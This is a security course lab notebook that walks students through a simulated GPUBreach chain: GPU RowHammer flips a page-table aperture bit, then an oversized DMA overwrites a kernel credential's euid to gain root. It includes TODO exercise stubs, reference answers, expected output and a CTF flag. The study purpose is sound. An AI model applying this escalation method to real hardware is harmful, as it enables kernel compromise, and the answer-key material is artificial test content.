> - Drive the hammer loop in cycle-accurate terms
> - Force the GPU MMU to pick up the corrupted entry
> - Craft a payload that exploits an intra-page OOB
> - Observe an end-to-end privilege escalation

### Phase 3 — Stretch: digging into the primitives

Optional short exercises: decode PTEs by hand, inspect the flipped bit, budget the hammer timing, prove the IOMMU does exactly what it claims (and no more), and craft tighter payloads.

> **Learning Objectives**
> - Work with PTE byte layouts at the bit level
> - Reason about hammer economics under refresh constraints
> - Distinguish IOMMU page-level enforcement from sub-page bounds checking
> - Understand why the cred struct sits where the attack needs it

### Phase 4 — Debrief (discussion)

Open-ended questions linking the lab back to real-world attack timing, ECC protection, IOMMU limits, and how an attacker would find the target PTE row without privileged access.


**Start the GPUBreach portion by importing the simulator and running the full instruction set from the original GPUBreach solution file:**


```python


# Import the GPUBreach simulator
import sys
from collections.abc import Callable
from pathlib import Path

for _path in [
    str(Path(__file__).resolve().parent),
    str(Path(__file__).resolve().parent.parent),
]:
    if _path not in sys.path:
        sys.path.insert(0, _path)

from aisb_utils import report
from gpubreach_sim import *
```

## Initial environment inspection

Start by creating an environment and inspecting the initial state to understand what we're working with.


```python

env = make_environment()

print("── Initial GPUBreach environment ──")
print(f"  PTE victim row      = {PTE_ROW} (DRAM row holding the target PTE)")
print(f"  PTE offset in row   = {PTE_OFFSET_IN_ROW} bytes from row start")
print(f"  GPU virtual address = 0x{VICTIM_GPU_VADDR:x} "
      f"(resolves via the PTE we'll corrupt)")
print(f"  PTE aperture        = {env.victim_pte.aperture} "
      f"(0 = GPU VRAM, 1 = system memory)")
print(f"  Kernel euid         = {env.kernel_cred.euid} "
      f"(0 would mean root)")
print(f"  Hammer threshold    = {HAMMER_THRESHOLD_ACTIVATIONS:,} "
      f"activations per aggressor")
print(f"  ACTIVATE-PRECHARGE  = {ACTIVATE_PRECHARGE_NS} ns")
print(f"  Refresh window      = {REFRESH_WINDOW_MS} ms")
print(f"  Driver buffer size  = {DRIVER_BUFFER_SIZE} bytes "
      f"(cred struct at offset {CRED_OFFSET} in a {PAGE_SIZE} byte page)")
```

## Simulator cheat sheet

The `gpubreach_sim` package is the simulated target — you will never edit
it, you will only *call into it* from your answers file. This cheat sheet
lists every symbol you'll touch, so you can refer back instead of hunting
through the imports.

**Entry points**

- `make_environment() -> Environment` — build a fresh target. Re-run any
  time you want a clean slate (useful between failed attempts).
- `env = make_environment()` — the `Environment` you'll mutate across the
  chain.
- `env.check_all()` — print a stage-by-stage report and, if all four
  stages succeeded, the flag.

**Attacker knowledge (constants you use as-is)**

- `PTE_ROW` — DRAM row holding the victim PTE (Page Table Entry).
- `PTE_OFFSET_IN_ROW` — byte offset of the PTE inside that row.
- `VICTIM_GPU_VADDR` — GPU virtual address whose PTE we corrupt.
- `FLAG` — the success flag (printed by `env.check_all()` on success).

**DRAM primitives** — on `env.dram` (class `DRAM`):

- `env.dram.hammer_once(aggressor_a, aggressor_b) -> int` — one round of
  double-sided hammering; returns the nanoseconds it cost. Only leaks
  charge into the victim row when `|a - b| == 2`.
- `env.dram.has_flipped(victim_row) -> bool` — True once a flip has
  landed in that row.
- `env.dram.read(row, offset, length) -> bytes` — read raw bytes from
  DRAM (used in the stretch track).
- `HAMMER_THRESHOLD_ACTIVATIONS`, `ACTIVATE_PRECHARGE_NS`,
  `REFRESH_WINDOW_MS`, `ROW_SIZE_BYTES`, `ROWS_PER_BANK` — DRAM
  parameters.

**GPU page-table primitives** — on `env.page_table` (class
`GPUPageTable`):

- `env.page_table.cached_pte` — the live PTE the GPU MMU is using. Has
  fields `.valid`, `.aperture`, `.physical_frame`.
- `env.page_table.sync_from_dram(env.dram)` — re-read the PTE from DRAM
  (models a TLB miss / invalidation).
- `APERTURE_GPU_LOCAL` (= 0), `APERTURE_SYSTEM` (= 1), `APERTURE_BIT_POS`
  (= 1), `PTE_BYTES` (= 8) — PTE layout constants.

**Driver / DMA primitives**

- `perform_gpu_dma(data, gpu_vaddr, page_table, iommu, gpu_dram,
  driver_page)` — the vulnerable driver fast path. Translates `gpu_vaddr`
  through the page table and performs the DMA. No length clamp.
- `env.iommu.validate(target_page, offset, length) -> bool` — probe the
  IOMMU's decision without actually performing a DMA (used in stretch
  3.5).
- `env.driver_page` — the host DMA-mapped page (class `DriverPage`).
- `env.kernel_cred.is_root() -> bool` — True iff the cred struct's euid
  is 0.
- `DRIVER_BUFFER_SIZE` (= 128), `CRED_OFFSET` (= 128), `PAGE_SIZE`
  (= 4096) — layout of the driver page.

Every call above is backed by a short docstring inside `gpubreach_sim/`
if you want to see what it does exactly.


## 1️⃣ Phase 1 — Understanding (30 min, no code)

Read each of the four comprehension exercises below and answer the
questions (plain-text comments in your answers file are fine). The
collapsed reference answers are there for when you finish, not to short-
circuit your thinking.

### Exercise 1.1: DRAM row organisation and the RowHammer threshold

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵🔵

A DRAM bank is a 2D grid of capacitor cells: rows of DRAM cells share a
single **row buffer**. Issuing an `ACTIVATE` copies a whole row into that
buffer. `PRECHARGE` closes the row. Every `ACTIVATE` perturbs
neighbouring rows a little — charge leaks across word-line coupling.

**Double-sided hammering** opens both `victim - 1` and `victim + 1` in
rapid succession so leakage piles up on both sides of the victim.
Accumulated leakage past a per-cell threshold flips a bit.

The device refreshes every row within `tREFW` (32–64ms in GDDR6). If the
attacker can't reach the flip threshold inside that window, the leakage
is wiped.

<details>
<summary><b>Question 1.1a:</b> Why two aggressors instead of one?</summary><blockquote>

Double-sided leaks charge into the victim from both sides every round;
effective leakage roughly doubles. This drops the required ACTIVATE count
by 2–5× on modern parts, from hundreds of millions (single-sided) to
~150k per aggressor (double-sided) on GDDR6. That is what makes the
attack practical inside a refresh window.
</blockquote></details>

<details>
<summary><b>Question 1.1b:</b> What does the refresh window buy the defender, and why is it not enough?</summary><blockquote>

It caps how long an attacker has to accumulate ACTIVATEs. In practice
150k activations × ~65ns per cycle ≈ 10–20ms of hammering, comfortably
inside a 32–64ms window — especially for adversarial code running on the
GPU itself, which can saturate the DRAM controller. Refreshing faster
costs bandwidth and still only moves the bar.
</blockquote></details>

<details>
<summary><b>Vocabulary: tREFI vs tREFW</b></summary><blockquote>

- **tREFI** (~1.9µs on GDDR6) — interval between REFRESH commands.
- **tREFW** (32–64ms) — the time in which every row gets refreshed at
  least once.

When this lab says "64ms refresh window" it means tREFW.
</blockquote></details>


### Exercise 1.2: GPU PTEs and the aperture bit

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵🔵

The GPU has its own MMU (memory management unit - translates virtual memory addresses into physical memory locations) with 8-byte PTEs stored in VRAM. Each PTE holds:

* a **valid** bit,
* an **aperture** bit — 0 = page lives in GPU VRAM, 1 = page lives in
  host system memory (reached over PCIe),
* a physical frame number (PFN),
* permission / cache-control flags.

A single bit flip changes the *target memory space* of every subsequent
DMA through that virtual address.

<details>
<summary><b>Question 1.2a:</b> SECDED ECC (error correction mechanism) is on the DRAM. Why does that not stop this attack?</summary><blockquote>

SECDED corrects 1-bit flips and detects 2-bit flips within a codeword.
GPUHammer shows that ECC-aware hammering patterns on A100/H100 drive two
flips per codeword, silently corrupting without raising a fault. The
attacker picks PTE locations whose paired flips line up with the hammer
template. ECC slows the attack down; it does not stop it.
</blockquote></details>

<details>
<summary><b>Question 1.2b:</b> After the aperture flips, the PFN bits in the PTE are unchanged. Why does the attacker still end up writing to a <em>useful</em> CPU page?</summary><blockquote>

Because they groomed host memory beforehand so that the PFN in the PTE
happens to match the driver's DMA-mapped page. Allocate + free cycles
until the kernel hands back the target PFN in a predictable position.
The coincidence is engineered, not luck. In this lab
`make_environment()` bakes it in.
</blockquote></details>


### Exercise 1.3: Why the IOMMU does not block this write

> **Difficulty**: 🔴🔴🔴⚪⚪
> **Importance**: 🔵🔵🔵🔵🔵

The IOMMU (Intel VT-d / AMD-Vi) enforces **page-granular** DMA isolation:
"this device may read/write this host physical page." It does not look
inside the page.

On the GPUBreach DMA the transaction comes from the GPU's PCIe BDF and
targets the driver's DMA-mapped page — legitimately mapped for that
device. The IOMMU signs off.

<details>
<summary><b>Question 1.3a:</b> What granularity does the IOMMU enforce, and why does that leave the OOB write unblocked?</summary><blockquote>

Page-level (4KB). It asks "is this page mapped for this device?" It does
not ask "is the write staying inside a sub-page software buffer?"
Enforcing sub-page bounds is the kernel's job — the driver's, in this
case — and that check is missing.
</blockquote></details>

<details>
<summary><b>Question 1.3b:</b> Would ATS / PASID change this?</summary><blockquote>

Not here. Both add context to IOMMU translations but still operate at
page granularity. They can narrow *which* pages a device may touch but
not enforce intra-page bounds inside a legitimately mapped page.
</blockquote></details>


### Exercise 1.4: Driver OOB → privilege escalation

> **Difficulty**: 🔴🔴🔴⚪⚪
> **Importance**: 🔵🔵🔵🔵⚪

The last link is a classic heap-adjacent out-of-bounds write. The
driver's DMA fast path copies caller-controlled `len(data)` bytes into
the DMA buffer at offset 0. It does not clamp `len(data)` to the
buffer's declared size. Immediately after the buffer, in the same page,
sits a kernel credential struct. Writing 0 into its `euid` gives the
caller root.

<details>
<summary><b>Question 1.4a:</b> Which CWE best captures the driver bug?</summary><blockquote>

**CWE-787: Out-of-bounds Write.** The write stays inside the allocated
page (IOMMU satisfied) but passes the software-defined end of the
buffer. Secondary fits: CWE-20 (missing input validation), CWE-119
(improper restriction of operations within buffer bounds).
</blockquote></details>

<details>
<summary><b>Question 1.4b:</b> Which kernel memory-safety mitigations <em>would</em> catch this, and which would not?</summary><blockquote>

**Catch it**: KASAN (redzones around allocations), a kernel rewritten in
Rust if the write goes through a bounds-checked slice, SLAB hardening
that moves the cred struct elsewhere.

**Don't catch it**: IOMMU (too coarse), stack canaries (no stack frame),
W^X / NX (data-only corruption), CFI / shadow stacks (no indirect call
redirection), SMEP / SMAP (protect against *CPU* user→kernel mistakes,
not PCIe DMA).
</blockquote></details>


## 2️⃣ Phase 2 — Must-finish: driving the attack to root

Five tiny coding exercises — one for each step in the chain. Each has a
test you run immediately after. Budget ~30–45 minutes total. At the end,
`env.check_all()` prints the flag.

| # | Step | What you write |
|---|------|----------------|
| 2.1 | Pick the right DRAM rows to hammer | `find_aggressors(victim_row)` |
| 2.2 | Hammer until a bit flips | `hammer_until_flip(dram, a, b, row)` |
| 2.3 | Make the GPU MMU pick up the flip | `trigger_pte_refresh(env)` |
| 2.4 | Build an oversized DMA payload | `craft_overflow_payload(euid=0)` |
| 2.5 | Fire the DMA and confirm root | `escalate_privileges(env, payload)` |

**Expected output when Phase 2 succeeds.** After running every cell
through to `env.check_all()`, your terminal should look like this (exact
numbers for rounds/ns will match on every machine because the flip row
is deterministic):

```text
Ex 2.1: aggressors for PTE_ROW=4242 → 4241, 4243
  Aggressor geometry correct!
Ex 2.2: flipped=True after 150,000 rounds (19.50 ms)
  Hammer loop and cycle accounting correct!
Ex 2.3: aperture 0 → 1 (expected 0 → 1)
  PT resync propagated the flip!
Ex 2.4: payload=132 bytes (128 filler + 4 euid)
  Payload layout correct!
Ex 2.5: root achieved? True
  End-to-end escalation succeeded!
── GPUBreach attack chain ──
  ✓ Stage 1 — aggressor rows identified
  ✓ Stage 2 — flip landed inside the 64ms refresh window
  ✓ Stage 3 — aperture bit flipped in the live PTE
  ✓ Stage 4 — OOB DMA wrote euid=0 into the cred struct

  🎉 All stages succeeded — root achieved.
  FLAG{gpubreach_rowhammer_aperture_oob_root}
```

If Phase 2 is taking **minutes** instead of **milliseconds**, you almost
certainly have a `|a - b| ≠ 2` bug in `find_aggressors` — double-check
Exercise 2.1 before anything else.


### Exercise 2.1: Aggressor rows for double-sided hammering

> **Difficulty**: 🔴⚪⚪⚪⚪
> **Importance**: 🔵🔵🔵⚪⚪

Given the row that holds the target PTE, return the two aggressor rows
that sandwich it. `DRAM.hammer_once(agg_a, agg_b)` only leaks into the
victim row when `|agg_a - agg_b| == 2` with the victim between them.


```python

def find_aggressors(victim_row: int) -> tuple[int, int]:
    """Return the two aggressor rows for double-sided hammering."""
    # TODO: Return (aggressor_a, aggressor_b) such that victim_row is between them
    # and |aggressor_a - aggressor_b| == 2
    return (0, 0)


agg_a, agg_b = find_aggressors(PTE_ROW)
print(f"Ex 2.1: aggressors for PTE_ROW={PTE_ROW} → {agg_a}, {agg_b}")
from day6_final_test import test_find_aggressors


test_find_aggressors(find_aggressors)

env.stage1_aggressors_ok = True
```

### Exercise 2.2: Hammer until a bit flips

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵⚪

Drive the hammer loop. Call `dram.hammer_once(agg_a, agg_b)` repeatedly
until `dram.has_flipped(victim_row)` becomes True. Return a dict with
keys "flipped", "rounds", "total_ns".


```python

def hammer_until_flip(dram: DRAM, agg_a: int, agg_b: int, victim_row: int, max_rounds: int = 2_000_000) -> dict:
    """Drive the DRAM into a RowHammer flip on ``victim_row``."""
    # TODO:
    # 1. Initialise total_ns and rounds counters.
    # 2. While `dram.has_flipped(victim_row)` is False (and you are
    #    below `max_rounds`):
    #      - call dram.hammer_once(aggressor_a, aggressor_b)
    #      - add its return value (nanoseconds) to total_ns
    #      - increment rounds
    # 3. Return {"rounds": rounds, "total_ns": total_ns,
    #            "flipped": dram.has_flipped(victim_row)}
    return {"rounds": 0, "total_ns": 0, "flipped": False}


flip_run = hammer_until_flip(env.dram, agg_a, agg_b, PTE_ROW)
print(
    f"Ex 2.2: flipped={flip_run['flipped']} after "
    f"{flip_run['rounds']:,} rounds "
    f"({flip_run['total_ns'] / 1_000_000:.2f} ms)"
)
from day6_final_test import test_hammer_until_flip


test_hammer_until_flip(hammer_until_flip)

env.stage2_flipped_in_refresh_window = (
    flip_run["flipped"]
    and flip_run["total_ns"] / 1_000_000 < REFRESH_WINDOW_MS
)
```

### Exercise 2.3: Force the MMU to re-walk the flipped PTE

> **Difficulty**: 🔴⚪⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵⚪

The DRAM bit is flipped, but the GPU MMU's cached copy still says
"aperture = GPU VRAM". Call `page_table.sync_from_dram(env.dram)` to
re-read the PTE bytes from DRAM, then return the `(before, after)` pair
of aperture values.

A real attacker triggers this re-walk with a GPU context switch, an
explicit TLB flush from the driver, or simply by waiting for the cache
line to be evicted.


```python


def trigger_pte_refresh(env: Environment) -> tuple[int, int]:
    """Resync the PT from DRAM. Return (before_aperture, after_aperture)."""
    # TODO: Capture before value, call sync_from_dram, capture after value
    return (0, 0)


before, after = trigger_pte_refresh(env)
print(f"Ex 2.3: aperture {before} → {after} (expected 0 → 1)")
from day6_final_test import test_trigger_pte_refresh


test_trigger_pte_refresh(trigger_pte_refresh)

env.stage3_aperture_changed = (before, after) == (
    APERTURE_GPU_LOCAL,
    APERTURE_SYSTEM,
)
```

### Exercise 2.4: Craft the OOB DMA payload

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵🔵

You need a byte string for the DMA payload such that:

1. Its length is exactly `DRIVER_BUFFER_SIZE + 4` bytes. The first
   `DRIVER_BUFFER_SIZE` bytes fill the driver buffer; the last 4 bytes
   overflow into the `euid` field of the cred struct.
2. The last 4 bytes encode the integer `0` (root's euid) as a 4-byte
   little-endian number — matching how `KernelCred.euid` is serialised.

You can put any content in the first `DRIVER_BUFFER_SIZE` bytes. The
convention is to use `b"A"` so the hexdump is easy to read.


```python


def craft_overflow_payload(new_euid: int = 0) -> bytes:
    """Return a DMA payload that overflows the driver buffer into euid."""
    # TODO:
    # 1. Fill `DRIVER_BUFFER_SIZE` bytes (e.g. b"A" repeated).
    # 2. Append the little-endian 4-byte encoding of `new_euid`.
    # 3. Return filler + euid_bytes.
    return b""


payload = craft_overflow_payload()
print(
    f"Ex 2.4: payload={len(payload)} bytes "
    f"({DRIVER_BUFFER_SIZE} filler + 4 euid)"
)
from day6_final_test import test_craft_overflow_payload


test_craft_overflow_payload(craft_overflow_payload)
```

### Exercise 2.5: Fire the DMA and confirm root

> **Difficulty**: 🔴⚪⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵🔵

Hand the payload to `perform_gpu_dma`. The simulator resolves the PTE,
validates the transaction with the IOMMU (which approves — the page is
mapped), and writes the payload into the driver page. The overflow lands
on the cred struct and `env.kernel_cred.is_root()` flips to True.

Call `perform_gpu_dma` with the positional arguments
`(payload, VICTIM_GPU_VADDR, env.page_table, env.iommu, env.dram,
env.driver_page)`, then return `env.kernel_cred.is_root()`.


```python


def escalate_privileges(env: Environment, payload: bytes) -> bool:
    """Perform the DMA. Return True iff the cred struct now shows root."""
    # TODO:
    # 1. Call perform_gpu_dma(payload, VICTIM_GPU_VADDR,
    #    env.page_table, env.iommu, env.dram, env.driver_page).
    # 2. Return env.kernel_cred.is_root().
    return False


rooted = escalate_privileges(env, payload)
print(f"Ex 2.5: root achieved? {rooted}")
from day6_final_test import test_escalate_privileges


test_escalate_privileges(escalate_privileges)

env.stage4_root_obtained = rooted
```

### Print the flag

If every stage above succeeded, `env.check_all()` prints the flag.
Otherwise it tells you which stage still needs work.


```python

env.check_all()
```

## 3️⃣ Phase 3 — Stretch: digging into the primitives (Optional)

Optional exercises for deeper understanding. Each is short and independent.

### Exercise 3.1 (Optional): Decode a PTE by hand

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵⚪⚪

Prove you understand the PTE byte layout by parsing an 8-byte PTE into a
dict of the form `{"valid": bool, "aperture": int, "physical_frame": int}`
without using `gpubreach_sim.pte.decode_pte`.

Recall the layout (from the PTE module docstring):

* byte 0: flags (bit 0 = valid, bit 1 = aperture, bits 2–7 reserved)
* bytes 1–6: 48-bit little-endian physical frame number
* byte 7: reserved


```python

def decode_pte_manually(raw: bytes) -> dict:
    """Hand-decoded PTE — do not call gpubreach_sim.decode_pte."""
    # TODO: pick apart raw[0], raw[1:7], bit by bit.
    return {"valid": False, "aperture": 0, "physical_frame": 0}


# A sample PTE: valid=1, aperture=1, PFN=0xABCDEF
sample = bytes([0b0000_0011]) + (0xABCDEF).to_bytes(6, "little") + b"\x00"
print(f"Ex 3.1: decoded = {decode_pte_manually(sample)}")
from day6_final_test import test_decode_pte_manually


test_decode_pte_manually(decode_pte_manually)
```

### Exercise 3.2 (Optional): Inspect the exact flipped bit

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵⚪⚪

Compare the PTE's raw bytes in DRAM before and after the RowHammer flip
and return the set of (byte_offset, bit_position) pairs that changed.
There should be exactly one.

You may use `env.dram.read(row, offset, length)` to grab bytes, and
you'll need a fresh environment so the "before" snapshot is pristine.


```python


def find_flipped_bits(before: bytes, after: bytes) -> set[tuple[int, int]]:
    """Return {(byte_index, bit_position), ...} where before != after."""
    # TODO: iterate over pairs of bytes, XOR them, and record each
    # differing bit as (byte_index, bit_position).
    return set()


fresh3 = make_environment()
pre = fresh3.dram.read(PTE_ROW, PTE_OFFSET_IN_ROW, PTE_BYTES)
while not fresh3.dram.has_flipped(PTE_ROW):
    fresh3.dram.hammer_once(PTE_ROW - 1, PTE_ROW + 1)
post = fresh3.dram.read(PTE_ROW, PTE_OFFSET_IN_ROW, PTE_BYTES)
print(f"Ex 3.2: flipped bits = {find_flipped_bits(pre, post)}")
from day6_final_test import test_find_flipped_bits


test_find_flipped_bits(find_flipped_bits)
```

### Exercise 3.3 (Optional): Budget the hammer against the refresh window

> **Difficulty**: 🔴⚪⚪⚪⚪
> **Importance**: 🔵🔵🔵⚪⚪

Before hammering, you'd want to know: will we even finish the activations
inside the refresh window? Compute:

1. The minimum number of hammer *rounds* to cross the flip threshold.
   Each round hits both aggressors, so each round adds one activation
   per aggressor.
2. The simulated nanoseconds those rounds will cost. Each round costs
   `2 * ACTIVATE_PRECHARGE_NS`.
3. Whether that total time fits inside the refresh window.

Return a dict with keys `"rounds"`, `"total_ns"`, `"total_ms"`,
`"fits_refresh_window"`.


```python

def hammer_budget(threshold: int = HAMMER_THRESHOLD_ACTIVATIONS, tRC_ns: int = ACTIVATE_PRECHARGE_NS, refresh_ms: int = REFRESH_WINDOW_MS) -> dict:
    """Compute worst-case hammering cost."""
    return {"rounds": 0, "total_ns": 0, "total_ms": 0.0, "fits_refresh_window": False}
    



budget = hammer_budget()
print(
    f"Ex 3.3: {budget['rounds']:,} rounds × {2 * ACTIVATE_PRECHARGE_NS} ns "
    f"= {budget['total_ms']:.2f} ms "
    f"(fits 64ms window: {budget['fits_refresh_window']})"
)
from day6_final_test import test_hammer_budget


test_hammer_budget(hammer_budget)
```

### Exercise 3.4 (Optional): Maximum hammer rounds inside the window

> **Difficulty**: 🔴⚪⚪⚪⚪
> **Importance**: 🔵🔵🔵⚪⚪

Flip the budget question around: given the refresh window, how *many*
rounds could the attacker fit at most? Compare it to
`HAMMER_THRESHOLD_ACTIVATIONS` — how comfortably do we fit?


```python

def max_rounds_in_window(refresh_ms: int = REFRESH_WINDOW_MS, tRC_ns: int = ACTIVATE_PRECHARGE_NS) -> int:
    """Maximum rounds that fit in refresh window."""
    return 0


max_rounds = max_rounds_in_window()
headroom = max_rounds / HAMMER_THRESHOLD_ACTIVATIONS
print(
    f"Ex 3.4: up to {max_rounds:,} rounds fit in {REFRESH_WINDOW_MS} ms "
    f"→ {headroom:.1f}× threshold headroom"
)
from day6_final_test import test_max_rounds_in_window


test_max_rounds_in_window(max_rounds_in_window)
```

### Exercise 3.5 (Optional): The IOMMU blocks what it promises to block

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵⚪

Prove the IOMMU is doing its job — it *does* block writes to physical
pages it has not mapped for the GPU. Use `env.iommu.validate(page, offset,
length)` to confirm:

1. Writes to `env.driver_page` at offset 0 with length `PAGE_SIZE` are
   allowed.
2. Writes to `env.driver_page` at offset 0 with length `PAGE_SIZE + 1`
   are rejected (cross a page boundary).
3. Writes to a *different* `DriverPage` instance are rejected (not
   mapped).

Return a dict with three booleans: `"intra_page_ok"`, `"overflow_page"`,
`"other_page"`.


```python


def probe_iommu(env: Environment) -> dict:
    """Probe IOMMU enforcement."""
    return {"intra_page_ok": False, "overflow_page": False, "other_page": False}


probe = probe_iommu(env)
print(f"Ex 3.5: IOMMU probe = {probe}")
from day6_final_test import test_probe_iommu


test_probe_iommu(probe_iommu)
```

### Exercise 3.6 (Optional): Measure the OOB overflow precisely

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵⚪⚪

Given a DMA payload length, how many bytes overflow past the driver
buffer into adjacent kernel memory? Return 0 if no overflow.


```python


def overflow_bytes(payload_len: int) -> int:
    """Bytes that overflow past DRIVER_BUFFER_SIZE."""
    return 0


for n in [0, DRIVER_BUFFER_SIZE - 1, DRIVER_BUFFER_SIZE, DRIVER_BUFFER_SIZE + 4]:
    print(f"Ex 3.6: payload {n}B → overflow {overflow_bytes(n)}B")
from day6_final_test import test_overflow_bytes


test_overflow_bytes(overflow_bytes)
```

### Exercise 3.7 (Optional): A tighter payload

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵⚪⚪

The payload in Exercise 2.4 overshoots — it writes 132 bytes where 132 is
exactly `DRIVER_BUFFER_SIZE + 4`. What if the cred struct's euid field
isn't at the very start of the overflow region, but at some `offset`
past `CRED_OFFSET`? Write a parameterised payload builder.

The new signature:
`craft_precise_payload(cred_offset_in_page: int, new_euid: int) → bytes`

The payload should have length `cred_offset_in_page + 4` so that the last
4 bytes land exactly at `cred_offset_in_page` inside the driver page —
when the driver copies starting at `DRIVER_BUFFER_OFFSET = 0`.


```python

def craft_precise_payload(cred_offset_in_page: int, new_euid: int) -> bytes:
    """Precise payload targeting specific offset."""
    return b""



tight = craft_precise_payload(CRED_OFFSET, 0)
print(f"Ex 3.7: precise payload is {len(tight)} bytes")
from day6_final_test import test_craft_precise_payload


test_craft_precise_payload(craft_precise_payload)
```

## GPUBreach Summary

You implemented an end-to-end GPUBreach-style attack chain:

1. **RowHammer** - Flipped a GPU DRAM bit within the refresh window
2. **Aperture corruption** - Redirected GPU virtual address from VRAM to system memory
3. **IOMMU bypass** - Leveraged legitimate page mapping for malicious DMA
4. **Privilege escalation** - Overwrote kernel credentials via buffer overflow

### Key Takeaways

- RowHammer is practical against GPU memory with comfortable timing margins
- Single bit flips in page table entries change memory access semantics
- IOMMU operates at page granularity, not sub-page buffer boundaries
- Defense requires structural changes: SLAB hardening, GPU isolation, refresh tuning

### Further Reading

- [GPUHammer: RowHammer Attacks on GPU Memories are Practical](https://gpuhammer.com/)
- [Flipping Bits in Memory Without Accessing Them](https://users.ece.cmu.edu/~yoonguk/papers/kim-isca14.pdf)
- [Exploiting the DRAM rowhammer bug to gain kernel privileges](https://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html)

---

## Final Summary

This comprehensive day covered three critical dimensions of AI infrastructure security:

### Key Takeaways

- **RAND framework**: OC1-OC5 threat actors and SL1-SL5 progressive controls give a structured way to match defenses to adversary capability. Model weights are uniquely sensitive — unlike traditional IP, they are immediately executable and high-value at terabyte scale.
- **IAPS policy lens**: Three critical attack vectors (side-channel, supply chain, weight exfiltration) and a four-point policy framework (standards, R&D, intelligence sharing, supply chain decoupling) coordinate government-industry response. Current data center practices are insufficient for AI-specific threats.
- **SL5 novel controls**: Five security domains (supply chain, network, machine, physical, personnel) require coordinated novel approaches. Reaching SL5 demands a *radical reduction* in trusted hardware/software components, and the document's 3-6 month feasibility assessment is the practical entry point for planning.
- **Vulnerability Research**: CVE-2025-23266 shows how LD_PRELOAD container escapes break trust-boundary assumptions in GPU container runtimes — namespaces/cgroups/seccomp don't protect host-side toolkit execution.
- **Attack Chain Implementation**: GPUBreach chains RowHammer → aperture bit flip → IOMMU bypass → kernel cred overwrite. Single bit flips in PTEs change memory-access semantics, and the IOMMU's page granularity leaves sub-page OOB writes unblocked.

### Implementation Priorities for Your Organization

- [ ] **Immediate (0-6 months)**: Implement container image signing and GPU access controls, update NVIDIA Container Toolkit to latest versions
- [ ] **Short-term (6-18 months)**: Deploy enhanced monitoring for GPU workloads, establish incident response procedures for AI infrastructure
- [ ] **Medium-term (1-3 years)**: Evaluate SL3+ security controls, implement hardware-based GPU isolation where feasible
- [ ] **Long-term (3-5 years)**: Plan for next-generation AI-specific security architecture aligned with SL5 recommendations

### Further Reading

**Policy and Framework Documents:**
- RAND Corporation: "Securing AI Model Weights" - https://www.rand.org/content/dam/rand/pubs/research_reports/RRA2800/RRA2849-1/RAND_RRA2849-1.pdf
- IAPS Research: "Accelerating AI Data Center Security" - https://www.iaps.ai/research/accelerating-ai-data-center-security
- NIST AI Risk Management Framework - https://www.nist.gov/itl/ai-risk-management-framework

**Vulnerability Research:**
- Wiz CVE-2025-23266 Analysis - https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape
- NVIDIA Security Advisories - https://www.nvidia.com/en-us/security/
- Container Escape Techniques - OWASP Container Security Guide

**GPU Security Research:**
- GPUHammer: RowHammer Attacks on GPU Memories - https://gpuhammer.com/
- GPU Side-Channel Attacks - https://leakcanary.net/
- AI Hardware Security - https://aivillage.org/large%20language%20models/threat-modeling-llm/

**Implementation Resources:**
- NVIDIA Container Toolkit Security Guide
- Kubernetes GPU Device Plugin Security
- Docker Security Best Practices for AI Workloads
